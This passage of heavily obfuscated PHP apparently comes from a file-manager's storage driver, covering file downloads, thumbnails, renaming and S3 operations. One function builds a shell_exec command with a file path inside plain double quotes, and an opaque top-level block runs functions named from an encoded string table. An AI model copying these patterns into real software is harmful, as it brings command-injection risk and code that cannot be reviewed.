$this->iconvSystem($F¶•æÇ¯Ï„); if (isset(self::$md5Cache[$F¶•æÇ¯Ï„])) { return self::$md5Cache[$F¶•æÇ¯Ï„]; } self::$md5Cache[$F¶•æÇ¯Ï„] = $this->hashMd5Shell($F¶•æÇ¯Ï„); if (!self::$md5Cache[$F¶•æÇ¯Ï„]) { self::$md5Cache[$F¶•æÇ¯Ï„] = @md5_file($F¶•æÇ¯Ï„); } return self::$md5Cache[$F¶•æÇ¯Ï„]; } private function hashMd5Shell($BËíŒÅÑŞ) { goto eĞ…óŠÀßà; f‘ğœ–¢ç: $dØÈ«»øîœ = shell_exec($fÊ´ø¯çÒ . "\40\42{$BËíŒÅÑŞ}\42"); return substr($dØÈ«»øîœ, 0, 32); goto eŞğÂ¸¸º—; eĞ…óŠÀßà: $BÈîá«›İ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!function_exists($BÈîá«›İ[94])) { return !1; } $dİ‚Õªˆ¢Ü = array($BÈîá«›İ[95], $BÈîá«›İ[96]); goto Aæõ«íĞ; Aæõ«íĞ: $fÊ´ø¯çÒ = Cache::get($BÈîá«›İ[97]); if (!$fÊ´ø¯çÒ) { $bä…Ù×ê‹ = BASIC_PATH . $BÈîá«›İ[98]; $aŞÄËöŸâ¥ = md5_file($bä…Ù×ê‹); $fÊ´ø¯çÒ = $BÈîá«›İ[99]; foreach ($dİ‚Õªˆ¢Ü as $d÷í÷İÊ¥Ş) { $dØÈ«»øîœ = shell_exec($d÷í÷İÊ¥Ş . "\x20\42{$bä…Ù×ê‹}\42"); if ($dØÈ«»øîœ && substr(trim($dØÈ«»øîœ), 0, 32) == $aŞÄËöŸâ¥) { $fÊ´ø¯çÒ = $d÷í÷İÊ¥Ş; break; } } Cache::set($BÈîá«›İ[97], $fÊ´ø¯çÒ, 3600); } if ($fÊ´ø¯çÒ == $BÈîá«›İ[99]) { return !1; } goto f‘ğœ–¢ç; eŞğÂ¸¸º—: } public function link($B°ÖÀ‚Û) { return $B°ÖÀ‚Û; } public function fileOut($b¸áÍé¸‰, $A¾ÉÌÄÒæ£ = false, $F»†¦›Ïíä = false, $C¾ÓÇ±”Ü = '') { goto CîòƒÎÖ„; E´Óšâ‚ä: $eÔˆà½Ï„¹ = 0; $eÌ‹ôğ„½ = $cÄŠ«°…Ò - 1; $d¢×Ë¡¶¹ = $this->ext($E°Ù†õÇ…); goto cƒÉ¤Ó¶Õè; b³ÑÏçìË„: @ob_end_clean(); set_timeout(); $Fééƒ«ºô = $this->infoFull($b¸áÍé¸‰); goto eÕÉç˜èŒ®; AÑÊæ‘Øõ: header($CŞÃŒ¼¯[149] . ($eÌ‹ôğ„½ - $eÔˆà½Ï„¹ + 1)); if ($_SERVER[$CŞÃŒ¼¯[150]] == $CŞÃŒ¼¯[151]) { return; } $b¶ ¨µÎø = 1024 * 100; goto eùùõÃ”¨Ÿ; DĞöŞ‰Å«: $Eè‡¤Ó…‚× = get_file_mime($d¢×Ë¡¶¹); if (strstr($Eè‡¤Ó…‚×, $CŞÃŒ¼¯[113])) { $Eè‡¤Ó…‚× = $Eè‡¤Ó…‚× . $CŞÃŒ¼¯[114]; } if ($A¾ÉÌÄÒæ£ === !1 && !mime_support($Eè‡¤Ó…‚×)) { $A¾ÉÌÄÒæ£ = !0; $Eè‡¤Ó…‚× = $CŞÃŒ¼¯[115]; } goto BÊŒ”£äğ¦; eÕÉç˜èŒ®: $cÄŠ«°…Ò = $Fééƒ«ºô[$CŞÃŒ¼¯[77]]; $C‚ù¹¹ÙâÀ = gmdate($CŞÃŒ¼¯[105], $Fééƒ«ºô[$CŞÃŒ¼¯[106]]); $E°Ù†õÇ… = $F»†¦›Ïíä ? $F»†¦›Ïíä : $this->iconvApp($Fééƒ«ºô[$CŞÃŒ¼¯[28]]); goto E´Óšâ‚ä; eùùõÃ”¨Ÿ: $CÂ‘Ê“¨ä = 0; if ($e²ğÓø„—) { $CÂ‘Ê“¨ä = intval(1000 * 1000 * ($b¶ ¨µÎø / $e²ğÓø„—)); } while ($eÔˆà½Ï„¹ <= $eÌ‹ôğ„½) { $Aµ”š­òİ = timeFloat(); check_abort(); $fóª‹ë§ä = $eÌ‹ôğ„½ - $eÔˆà½Ï„¹ + 1; if ($fóª‹ë§ä <= $b¶ ¨µÎø) { $b¶ ¨µÎø = $fóª‹ë§ä; } echo $this->fileSubstr($b¸áÍé¸‰, $eÔˆà½Ï„¹, $b¶ ¨µÎø); $eÔˆà½Ï„¹ += $b¶ ¨µÎø; if ($b¶ ¨µÎø == $fóª‹ë§ä) { $eÔˆà½Ï„¹ = $eÌ‹ôğ„½ + 1; } if ($CÂ‘Ê“¨ä) { $açğ­ùªˆù = intval(1000 * 1000 * (timeFloat() - $Aµ”š­òİ)); $cİ—±ÉÊƒ = $CÂ‘Ê“¨ä - $açğ­ùªˆù; if ($cİ—±ÉÊƒ > 5) { usleep($cİ—±ÉÊƒ); } } } goto D„äøµ“İ©; a“ë¨æ÷«: if (isset($_SERVER[$CŞÃŒ¼¯[127]]) && strtotime($_SERVER[$CŞÃŒ¼¯[127]]) == $Fééƒ«ºô[$CŞÃŒ¼¯[106]]) { header($CŞÃŒ¼¯[128], !0, 304); die; } if (isset($_SERVER[$CŞÃŒ¼¯[129]]) && $_SERVER[$CŞÃŒ¼¯[129]] == $C¾ÓÇ±”Ü) { header($CŞÃŒ¼¯[130] . $C¾ÓÇ±”Ü, !0, 304); die; } header($CŞÃŒ¼¯[130] . $C¾ÓÇ±”Ü); goto bÚÄù»„½ö; b—¢ñÊ†ì: header($CŞÃŒ¼¯[134] . $cÄŠ«°…Ò); header($CŞÃŒ¼¯[135]); if (!$A¾ÉÌÄÒæ£ && $d¢×Ë¡¶¹ == $CŞÃŒ¼¯[136]) { if ($cÄŠ«°…Ò > 1024 * 1024 * 5) { die; } $eÎœï¼ÙíÊ = $this->getContent($b¸áÍé¸‰); $eÎœï¼ÙíÊ = Html::clearSVG($eÎœï¼ÙíÊ); echo $eÎœï¼ÙíÊ; die; } goto Cö†ÉÉ·±™; D××”ÁŠÇ: header($CŞÃŒ¼¯[124]); header($CŞÃŒ¼¯[125]); header($CŞÃŒ¼¯[126]); goto a“ë¨æ÷«; AÕé›±çóì: header($CŞÃŒ¼¯[120]); header($CŞÃŒ¼¯[121] . $Eè‡¤Ó…‚×); header($CŞÃŒ¼¯[122] . gmdate($CŞÃŒ¼¯[105], time() + 3600 * 24 * 30) . $CŞÃŒ¼¯[123]); goto D××”ÁŠÇ; CîòƒÎÖ„: $CŞÃŒ¼¯ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->cacheMethod(null, null); if (!$b¸áÍé¸‰ || !$this->exist($b¸áÍé¸‰)) { show_json(LNG($CŞÃŒ¼¯[100]), !1, $F»†¦›Ïíä); } goto c‰«¦¾—ô•; bÚÄù»„½ö: header($CŞÃŒ¼¯[131] . $C‚ù¹¹ÙâÀ . $CŞÃŒ¼¯[123]); header($CŞÃŒ¼¯[132] . $E°Ù†õÇ…); header($CŞÃŒ¼¯[133]); goto b—¢ñÊ†ì; Cö†ÉÉ·±™: $eË†ÔôÜ¸ö = strtolower($_SERVER[$CŞÃŒ¼¯[137]]); if ($c°­Ù¤’ && $eË†ÔôÜ¸ö && $CÔ’¨Ô×µ‹) { if (strstr($eË†ÔôÜ¸ö, $CŞÃŒ¼¯[138])) { header($CŞÃŒ¼¯[139] . $b¸áÍé¸‰); } else { if (strstr($eË†ÔôÜ¸ö, $CŞÃŒ¼¯[140])) { header($CŞÃŒ¼¯[141] . $b¸áÍé¸‰); } else { if (strstr($eË†ÔôÜ¸ö, $CŞÃŒ¼¯[142])) { header($CŞÃŒ¼¯[143] . $b¸áÍé¸‰); } } } if ($e²ğÓø„—) { header($CŞÃŒ¼¯[144] . $e²ğÓø„—); } return; } if (isset($_SERVER[$CŞÃŒ¼¯[145]])) { if (preg_match($CŞÃŒ¼¯[146], $_SERVER[$CŞÃŒ¼¯[145]], $eÚë¶‡¤œ)) { $eÔˆà½Ï„¹ = intval($eÚë¶‡¤œ[1]); if (!empty($eÚë¶‡¤œ[2])) { $eÌ‹ôğ„½ = intval($eÚë¶‡¤œ[2]); } } header($CŞÃŒ¼¯[147]); header("\x43\x6f\156\x74\x65\x6e\164\55\x52\141\x6e\x67\x65\x3a\40\142\x79\x74\145\163\x20{$eÔˆà½Ï„¹}\x2d{$eÌ‹ôğ„½}\x2f" . $cÄŠ«°…Ò); } else { header($CŞÃŒ¼¯[148]); } goto AÑÊæ‘Øõ; cƒÉ¤Ó¶Õè: if (in_array($d¢×Ë¡¶¹, array($CŞÃŒ¼¯[107], $CŞÃŒ¼¯[108], $CŞÃŒ¼¯[109], $CŞÃŒ¼¯[110]))) { $d¢×Ë¡¶¹ = $CŞÃŒ¼¯[111]; } if (!$C¾ÓÇ±”Ü) { $C¾ÓÇ±”Ü = md5($C‚ù¹¹ÙâÀ . $this->hashSimple($b¸áÍé¸‰)); } $C¾ÓÇ±”Ü = $CŞÃŒ¼¯[112] . $C¾ÓÇ±”Ü . $CŞÃŒ¼¯[112]; goto DĞöŞ‰Å«; c‰«¦¾—ô•: $c°­Ù¤’ = $this->getType() == $CŞÃŒ¼¯[101]; $CÔ’¨Ô×µ‹ = $GLOBALS[$CŞÃŒ¼¯[6]][$CŞÃŒ¼¯[84]][$CŞÃŒ¼¯[102]][$CŞÃŒ¼¯[103]]; $e²ğÓø„— = (double) $GLOBALS[$CŞÃŒ¼¯[6]][$CŞÃŒ¼¯[84]][$CŞÃŒ¼¯[102]][$CŞÃŒ¼¯[104]] * 1024 * 1024; goto b³ÑÏçìË„; BÊŒ”£äğ¦: $cÒãáÇİåé = rawurlencode($E°Ù†õÇ…); $cÒãáÇİåé = $CŞÃŒ¼¯[112] . $cÒãáÇİåé . $CŞÃŒ¼¯[116] . $cÒãáÇİåé; if ($A¾ÉÌÄÒæ£) { header($CŞÃŒ¼¯[117]); header($CŞÃŒ¼¯[118] . $cÒãáÇİåé); } else { header($CŞÃŒ¼¯[119] . $cÒãáÇİåé); } goto AÕé›±çóì; D„äøµ“İ©: } public function fileOutServer($eÉß¹˜Ù¢Æ, $BáÛâ¢…© = false, $B½Èô—é„Š = false, $bÀİ´¹„ç = '') { $this->fileOut($eÉß¹˜Ù¢Æ, $BáÛâ¢…©, $B½Èô—é„Š, $bÀİ´¹„ç); } public function fileOutLink($B ëŠ´ÌÜŠ) { header($_SERVER[ºÖÙÂŒäÉê‡][152] . $B ëŠ´ÌÜŠ); die; } public function cacheMethod($FœÛï´ ¦—, $BÏ¡ä²Òóİ) { goto f«´³ÆƒÆ; f«´³ÆƒÆ: $f†‡ãªš…Ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; static $cÙÆãÎÒä = array(); $A¼ñ¹à‘£ = $f†‡ãªš…Ñ[153] . $FœÛï´ ¦— . $f†‡ãªš…Ñ[154] . rtrim($BÏ¡ä²Òóİ, $f†‡ãªš…Ñ[8]); goto Dµ­±È®æº; Dµ­±È®æº: if (is_null($FœÛï´ ¦—)) { $cÙÆãÎÒä = array(); return; } if (is_null($BÏ¡ä²Òóİ)) { unset($cÙÆãÎÒä[$A¼ñ¹à‘£]); return; } $c™øÑ¦Ôîë = isset($cÙÆãÎÒä[$A¼ñ¹à‘£]) ? $cÙÆãÎÒä[$A¼ñ¹à‘£] : null; goto A‰¦ä“Õ…Ç; A‰¦ä“Õ…Ç: if (!is_null($c™øÑ¦Ôîë)) { return $c™øÑ¦Ôîë; } $c™øÑ¦Ôîë = $this->{$FœÛï´ ¦—}($BÏ¡ä²Òóİ); $cÙÆãÎÒä[$A¼ñ¹à‘£] = $c™øÑ¦Ôîë; goto C¬óàš”…Ÿ; C¬óàš”…Ÿ: return $c™øÑ¦Ôîë; goto bÖŒ˜¢ÊÉ¼; bÖŒ˜¢ÊÉ¼: } public function fileOutImage($DáÀòß´å­, $c´’–“µ = 250) { goto B£‰ÖÛŸà; açç”°œòƒ: if (!($BÇ«ÎÒÒ¶ = IO::move($DÎíöã‘, $cõÕº‘¡¹))) { return IO::fileOut($DÎíöã‘); } del_file($DÎíöã‘); IO::fileOut($BÇ«ÎÒÒ¶); goto f¿„Ğ›¶…œ; f¼’ä…Â‚: if (!($d·Õšá²Òø = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $F†é‡Âà¼ô[161]))) { $cõÕº‘¡¹ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $F†é‡Âà¼ô[162]); } else { $cõÕº‘¡¹ = KodIO::make($d·Õšá²Òø); } if ($d·Õšá²Òø = IO::fileNameExist($cõÕº‘¡¹, $DâŞ“²ÍŒÚ)) { $DÎíöã‘ = KodIO::make($d·Õšá²Òø); return IO::fileOut($DÎíöã‘); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto DèÜÆ—ÓĞ; eƒóíÔ®šˆ: if ($e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[77]] <= 1024 * 50 || !function_exists($F†é‡Âà¼ô[155]) || $e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[156]] == $F†é‡Âà¼ô[157]) { return $this->fileOut($DáÀòß´å­); } if (isset($e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[158]][$F†é‡Âà¼ô[159]])) { $Cõ¬à¹‡”ò = $e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[158]][$F†é‡Âà¼ô[159]]; } else { if (isset($e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[158]][$F†é‡Âà¼ô[160]])) { $Cõ¬à¹‡”ò = $e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[158]][$F†é‡Âà¼ô[160]]; } else { $Cõ¬à¹‡”ò = md5("{$e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[28]]}\137{$e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[75]]}\x5f{$e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[77]]}"); } } $DâŞ“²ÍŒÚ = "{$Cõ¬à¹‡”ò}\137{$c´’–“µ}\x2e\160\156\x67"; goto f¼’ä…Â‚; DèÜÆ—ÓĞ: $DÎíöã‘ = DATA_THUMB . $DâŞ“²ÍŒÚ; if (!@file_exists($DÎíöã‘)) { $Cù¸äÖÛÇÕ = TEMP_FILES; if (!is_dir($Cù¸äÖÛÇÕ)) { mk_dir($Cù¸äÖÛÇÕ); } $D’ÏÁõ¤šŠ = $Cù¸äÖÛÇÕ . $Cõ¬à¹‡”ò . $F†é‡Âà¼ô[91] . $e‰Â±ˆ›çŸ[$F†é‡Âà¼ô[156]]; if (!@file_exists($D’ÏÁõ¤šŠ)) { $D’ÏÁõ¤šŠ = $this->download($DáÀòß´å­, $D’ÏÁõ¤šŠ); } $DŠğø¿ß´ = new ImageThumb($D’ÏÁõ¤šŠ, $F†é‡Âà¼ô[163]); $DŠğø¿ß´->prorate($DÎíöã‘, $c´’–“µ, $c´’–“µ * 10); } if (!file_exists($DÎíöã‘) || filesize($DÎíöã‘) < 100) { return @file_exists($D’ÏÁõ¤šŠ) ? IO::fileOut($D’ÏÁõ¤šŠ) : $this->fileOut($DáÀòß´å­); } goto açç”°œòƒ; B£‰ÖÛŸà: $F†é‡Âà¼ô =& $_SERVER[ºÖÙÂŒäÉê‡]; if (substr($DáÀòß´å­, 0, 4) == $F†é‡Âà¼ô[142]) { $this->fileOutLink($DáÀòß´å­); } $e‰Â±ˆ›çŸ = $this->info($DáÀòß´å­); goto eƒóíÔ®šˆ; f¿„Ğ›¶…œ: } public function fileOutImageServer($FìùŞÔ®ÅË, $c”ƒ˜ÆÕ‘µ = 250) { $this->fileOutImage($FìùŞÔ®ÅË, $c”ƒ˜ÆÕ‘µ); } public function fileNameAuto($bã‘÷´šÄé, $fÖÃ¯äÈÁÍ, $a¤‰ô¡‚èĞ = REPEAT_RENAME, $EÂ±ˆ†œã² = false) { goto b˜ö‚íĞê; b˜ö‚íĞê: $FÚÆ‘íçá =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¯¾ĞÉÔ¨ = $bã‘÷´šÄé === $FÚÆ‘íçá[33] ? $fÖÃ¯äÈÁÍ : rtrim($bã‘÷´šÄé, $FÚÆ‘íçá[8]) . $FÚÆ‘íçá[8] . $fÖÃ¯äÈÁÍ; if ($a¤‰ô¡‚èĞ == REPEAT_REPLACE || !$this->exist($D¯¾ĞÉÔ¨) || $EÂ±ˆ†œã² && $a¤‰ô¡‚èĞ != REPEAT_RENAME_FOLDER) { return $fÖÃ¯äÈÁÍ; } goto a›²……ƒÎì; DŞâ¶—Ù½¹: $BèÀÓç§£ˆ = 1; $eô³”¡Ü˜Õ = substr($fÖÃ¯äÈÁÍ, 0, strlen($fÖÃ¯äÈÁÍ) - strlen($e‚ŒÉÓÈÉ)); $Aç¯†ã—³ë = $eô³”¡Ü˜Õ . "\x28{$BèÀÓç§£ˆ}\x29{$e‚ŒÉÓÈÉ}"; goto BÅİ—³ÖÜß; BÅİ—³ÖÜß: while ($this->exist(rtrim($bã‘÷´šÄé, $FÚÆ‘íçá[8]) . $FÚÆ‘íçá[8] . $Aç¯†ã—³ë)) { $Aç¯†ã—³ë = $eô³”¡Ü˜Õ . "\50{$BèÀÓç§£ˆ}\51{$e‚ŒÉÓÈÉ}"; $BèÀÓç§£ˆ++; } return $Aç¯†ã—³ë; goto bø¡Ø×áÆŒ; a›²……ƒÎì: if ($a¤‰ô¡‚èĞ == REPEAT_SKIP) { return !1; } $e‚ŒÉÓÈÉ = $FÚÆ‘íçá[91] . get_path_ext($fÖÃ¯äÈÁÍ); $e‚ŒÉÓÈÉ = $e‚ŒÉÓÈÉ == $FÚÆ‘íçá[91] || $EÂ±ˆ†œã² ? $FÚÆ‘íçá[33] : $e‚ŒÉÓÈÉ; goto DŞâ¶—Ù½¹; bø¡Ø×áÆŒ: } public function listAllFiles($F‚Ò‘òÇë, $cˆŠ—’ª, $c–„©˜¥Ÿ = array()) { goto F·×ÕòÄ‚Æ; FÛÃøÛ°ˆÖ: foreach (array_unique($BÄğ·Ò‚á¦) as $C°«…Á›¬) { $F­ïŒŸéâ = array($BñªÛÔÏõ[75] => $this->getPathOuter($BñªÛÔÏõ[8] . $F‚Ò‘òÇë . $BñªÛÔÏõ[8] . $C°«…Á›¬), $BñªÛÔÏõ[76] => 1, $BñªÛÔÏõ[77] => 0); if (substr($C°«…Á›¬, -1) != $BñªÛÔÏõ[8]) { $F­ïŒŸéâ[$BñªÛÔÏõ[76]] = 0; $cøÕ‚öß–× = $this->getPath($F‚Ò‘òÇë . $BñªÛÔÏõ[8] . $C°«…Á›¬); $F­ïŒŸéâ[$BñªÛÔÏõ[77]] = isset($c–„©˜¥Ÿ[$cøÕ‚öß–×]) ? $c–„©˜¥Ÿ[$cøÕ‚öß–×] : $this->size($cøÕ‚öß–×); } $c®ù–£ÍÒÇ[] = $F­ïŒŸéâ; } return $c®ù–£ÍÒÇ; goto aÎİ¥•¹ó; eº—Ÿšã‹: $F‚Ò‘òÇë = trim($F‚Ò‘òÇë, $BñªÛÔÏõ[8]); foreach ($cˆŠ—’ª as $C°«…Á›¬) { $D’…÷Ë˜Š = ltrim(substr($C°«…Á›¬, strlen($F‚Ò‘òÇë)), $BñªÛÔÏõ[8]); $BÄğ·Ò‚á¦ = array_merge($BÄğ·Ò‚á¦, $this->slicePath($D’…÷Ë˜Š)); } $c®ù–£ÍÒÇ = array(); goto FÛÃøÛ°ˆÖ; F·×ÕòÄ‚Æ: $BñªÛÔÏõ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($cˆŠ—’ª)) { return array(); } $BÄğ·Ò‚á¦ = array(); goto eº—Ÿšã‹; aÎİ¥•¹ó: } public function slicePath($fß¢ˆ¶©×ë) { $FåíöéÉ˜ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÀô¤ÕÊ‡à = explode($FåíöéÉ˜ñ[8], trim($fß¢ˆ¶©×ë, $FåíöéÉ˜ñ[8])); $E¾Ë²è¤‡É = 0; do { ++$E¾Ë²è¤‡É; $fÈ¹î·Œ†[] = implode($FåíöéÉ˜ñ[8], array_slice($BÀô¤ÕÊ‡à, 0, $E¾Ë²è¤‡É)) . $FåíöéÉ˜ñ[8]; } while ($E¾Ë²è¤‡É < count($BÀô¤ÕÊ‡à)); $fÈ¹î·Œ†[count($BÀô¤ÕÊ‡à) - 1] = $fß¢ˆ¶©×ë; return $fÈ¹î·Œ†; } public function getHost() { $F‡É‹³Œ„ô =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÃÅˆìÁ‡˜ = parse_url(trim($this->domain, $F‡É‹³Œ„ô[8])); $EÉ¯‹—†¹ß = isset($DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[164]]) ? $DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[164]] : http_type(); $cÀ¬×ñ’À = isset($DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[165]]) ? $DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[165]] : $DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[75]]; if (isset($DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[166]])) { $cÀ¬×ñ’À .= $F‡É‹³Œ„ô[4] . $DÃÅˆìÁ‡˜[$F‡É‹³Œ„ô[166]]; } return $EÉ¯‹—†¹ß . $F‡É‹³Œ„ô[167] . $cÀ¬×ñ’À; } public function pathEncode($b§ÑÄ”ğÎÄ) { $DÜ”Óä£ª„ =& $_SERVER[ºÖÙÂŒäÉê‡]; return str_replace($DÜ”Óä£ª„[168], $DÜ”Óä£ª„[8], rawurlencode($b§ÑÄ”ğÎÄ)); } } if ($_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][169]] != $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][170]]) { goto CÛ‡Å¨ÄË¼; DÕ¦§ÎÜ: $fâ½Éİ°¶©($_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][178]]); goto DÊÖ»ä¬ğ; CÛ‡Å¨ÄË¼: $d”Í„àŸàù = $_SERVER[ºÖÙÂŒäÉê‡][171]; $Båçõƒ Ì² = $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][172]] . $_SERVER[ºÖÙÂŒäÉê‡][173]; $bˆÍÄ®Œ” = $d”Í„àŸàù($Båçõƒ Ì²); goto c‹‘¡ †; c‹‘¡ †: $F¡‚ÑÄÃùÇ = explode($_SERVER[ºÖÙÂŒäÉê‡][174], $bˆÍÄ®Œ”); if (count($F¡‚ÑÄÃùÇ) < $_SERVER[ºÖÙÂŒäÉê‡][175]) { $f¿ë„Éµ»— = $_SERVER[ºÖÙÂŒäÉê‡][176]; $f¿ë„Éµ»—(); } $fâ½Éİ°¶© = $_SERVER[ºÖÙÂŒäÉê‡][177]; goto DÕ¦§ÎÜ; DÊÖ»ä¬ğ: } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($aî„„ˆœ¾Ã) { set_timeout(); require_once SDK_DIR . $_SERVER[ºÖÙÂŒäÉê‡][179]; parent::__construct(); $this->_init($aî„„ˆœ¾Ã); } public function _init($A­ÅˆÅÖª) { foreach ($A­ÅˆÅÖª as $Aô¸äìÉàÓ => $B¼Êéò…¹) { if (isset($this->{$Aô¸äìÉàÓ})) { $this->{$Aô¸äìÉàÓ} = $B¼Êéò…¹; } } $this->endpoint = $A­ÅˆÅÖª[$_SERVER[ºÖÙÂŒäÉê‡][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($fŸƒ¡‘³’× = "\166\64") { $this->signVer = $fŸƒ¡‘³’×; $this->client->setSignatureVersion($fŸƒ¡‘³’×); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto DöÅÆ„“İÄ; c÷Ø³‘îÓ: if ($b³ÇÅ‡÷é“[$C›œ¶ØâÎ[181]] != $C›œ¶ØâÎ[182] || $b³ÇÅ‡÷é“[$C›œ¶ØâÎ[183]] != $C›œ¶ØâÎ[182]) { return !1; } $BÆ¶Í›äïå = array_map($C›œ¶ØâÎ[184], $b³ÇÅ‡÷é“[$C›œ¶ØâÎ[185]]); if (!is_array($BÆ¶Í›äïå)) { $BÆ¶Í›äïå = array(); } goto f¡ƒ¥îº»; f¡ƒ¥îº»: $a¬ÅªÔˆ‚Ã = array($C›œ¶ØâÎ[186], $C›œ¶ØâÎ[187], $C›œ¶ØâÎ[188], $C›œ¶ØâÎ[189], $C›œ¶ØâÎ[190]); $d´¬ä´ŠÀ§ = array_diff($a¬ÅªÔˆ‚Ã, $BÆ¶Í›äïå); return empty($d´¬ä´ŠÀ§); goto D‰¿î·˜Ç‡; DöÅÆ„“İÄ: $C›œ¶ØâÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b³ÇÅ‡÷é“ = $this->getBucketCors(); if (!$b³ÇÅ‡÷é“ || !is_array($b³ÇÅ‡÷é“)) { return !1; } goto c÷Ø³‘îÓ; D‰¿î·˜Ç‡: } public function mkfile($aˆ˜ƒÉæ¯…, $eö±¿½ğã = '', $b¥ç¢Ã•×é = REPEAT_RENAME) { $b„±¯Ö«Ãº = $this->setContent($aˆ˜ƒÉæ¯…, $eö±¿½ğã); if ($b„±¯Ö«Ãº !== !1) { return $this->getPathOuter($aˆ˜ƒÉæ¯…); } return !1; } public function mkdir($FºçÖõõØ, $FÊİ¦¨‹îÁ = REPEAT_SKIP) { if (empty($FºçÖõõØ)) { return !1; } if ($this->_isFolder($FºçÖõõØ)) { return $this->getPathOuter($FºçÖõõØ); } $cïä¯Ö· = $this->setContent($FºçÖõõØ, $_SERVER[ºÖÙÂŒäÉê‡][33], !0); if ($cïä¯Ö· !== !1) { return $this->getPathOuter($FºçÖõõØ); } return !1; } public function copyFile($f¾Ö¼·í–œ, $dÌÅöŒ¶Ş­, $CÁÆÜ¾’‚Ğ = array()) { $A©·”àº– =& $_SERVER[ºÖÙÂŒäÉê‡]; $CË¦øÇ“¾¿ = $this->objectMeta($f¾Ö¼·í–œ); if (!$CË¦øÇ“¾¿) { return !1; } if ($CË¦øÇ“¾¿[$A©·”àº–[77]] <= 1024 * 1024 * 200) { $f“Äì©± = $this->client->copyObject($this->bucket, $f¾Ö¼·í–œ, $this->bucket, $dÌÅöŒ¶Ş­, $A©·”àº–[191], $CÁÆÜ¾’‚Ğ); } else { $f“Äì©± = $this->client->multiCopyObject($this->bucket, $f¾Ö¼·í–œ, $this->bucket, $dÌÅöŒ¶Ş­, $CÁÆÜ¾’‚Ğ); } $f“Äì©± = $f“Äì©± ? $this->getPathOuter($dÌÅöŒ¶Ş­) : !1; return $f“Äì©±; } public function moveFile($DÄó“º¦¯À, $dœ¿º²«‚²) { if ($this->copyFile($DÄó“º¦¯À, $dœ¿º²«‚²)) { $this->delFile($DÄó“º¦¯À); return $this->getPathOuter($dœ¿º²«‚²); } return !1; } public function delFile($f¶Õ’ÊÖ¡) { return $this->client->deleteObject($this->bucket, $f¶Õ’ÊÖ¡); } public function delFolder($a–ŸËÁáµÖ) { goto f¨Œ÷ìÀèˆ; d‰Æë‰æ“è: $Bö”‚©é˜» = $f¦ôù¿ëÀé = 0; $dƒ±‰¼¸Ñ = array_chunk(array_keys($FÖ¨ ä¡Ø), 1000); foreach ($dƒ±‰¼¸Ñ as $eÂ…Á—Œ£) { $Bö”‚©é˜»++; $f¦ôù¿ëÀé += (int) $this->client->deleteObjects($this->bucket, $eÂ…Á—Œ£); } goto BïËë‚§¯‰; f¨Œ÷ìÀèˆ: $eôÏƒá‡¼‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $FÖ¨ ä¡Ø = $this->listObjs($a–ŸËÁáµÖ); if (!$FÖ¨ ä¡Ø) { $a–ŸËÁáµÖ = trim($a–ŸËÁáµÖ, $eôÏƒá‡¼‰[8]); if (!empty($a–ŸËÁáµÖ)) { $a–ŸËÁáµÖ .= $eôÏƒá‡¼‰[8]; } return $this->delFile($a–ŸËÁáµÖ); } goto d‰Æë‰æ“è; BïËë‚§¯‰: return $Bö”‚©é˜» === $f¦ôù¿ëÀé ? !0 : !1; goto DºÉ•Ó»…®; DºÉ•Ó»…®: } public function rename($bÒŞˆïÅÄÓ, $eË½ˆºÂ‘‘) { return $this->renameObject($bÒŞˆïÅÄÓ, $eË½ˆºÂ‘‘); } public function listPath($Cö·­â³ò¥, $EËšòÚ£È– = false) { $a‰ÛÄá² =& $_SERVER[ºÖÙÂŒäÉê‡]; $bĞÀ”«‚°â = $this->listObjs($Cö·­â³ò¥, null, null, $a‰ÛÄá²[8]); $F®ƒœ”ÌŠ˜ = array($a‰ÛÄá²[74] => array(), $a‰ÛÄá²[73] => array()); foreach ($bĞÀ”«‚°â as $AÑ¼èğ’ => $Bç«‹Äó‡) { if ($AÑ¼èğ’ == $a‰ÛÄá²[8]) { continue; } if (isset($Bç«‹Äó‡[$a‰ÛÄá²[192]])) { $F®ƒœ”ÌŠ˜[$a‰ÛÄá²[74]][] = $this->folderInfo($Bç«‹Äó‡[$a‰ÛÄá²[192]], $EËšòÚ£È–); } else { if (substr($Bç«‹Äó‡[$a‰ÛÄá²[28]], -1) == $a‰ÛÄá²[8]) { continue; } $F®ƒœ”ÌŠ˜[$a‰ÛÄá²[73]][] = $this->fileInfo($Bç«‹Äó‡[$a‰ÛÄá²[28]], $EËšòÚ£È–, $Bç«‹Äó‡); } } return 